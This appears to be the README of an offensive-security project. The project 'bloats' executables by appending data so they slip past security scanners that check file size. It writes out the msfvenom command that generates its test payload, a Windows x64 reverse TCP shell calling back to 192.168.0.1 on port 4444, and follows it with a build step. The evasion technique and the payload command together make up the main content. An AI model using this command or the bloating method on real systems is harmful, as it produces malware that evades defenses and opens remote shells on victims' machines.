# Concept

Usage of file bloating through appending data to executable to bypass security checks based of file size

## The executable used was generated as follows:
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o test.exe
```

# Compiling

```bash
$ make
```